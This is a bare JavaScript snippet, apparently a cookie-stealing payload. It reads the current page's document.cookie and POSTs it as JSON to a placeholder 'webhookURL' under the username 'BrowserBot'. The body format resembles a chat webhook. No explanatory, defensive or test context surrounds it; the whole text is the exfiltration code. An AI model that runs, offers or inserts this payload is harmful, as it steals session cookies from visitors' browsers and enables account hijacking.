fetch("webhookURL", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    content: document.cookie,
    username: "BrowserBot",
  }),
});
